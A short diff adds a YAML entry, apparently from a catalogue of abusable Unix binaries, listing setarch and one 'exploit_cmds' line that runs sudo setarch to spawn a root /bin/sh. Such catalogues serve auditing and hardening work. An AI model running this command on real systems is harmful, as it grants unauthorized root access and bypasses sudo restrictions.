@@ -1,0 +1,4 @@
+name: setarch
+binary_path: /usr/bin/setarch
+exploit_cmds:
+- sudo /usr/bin/setarch -3 /bin/sh
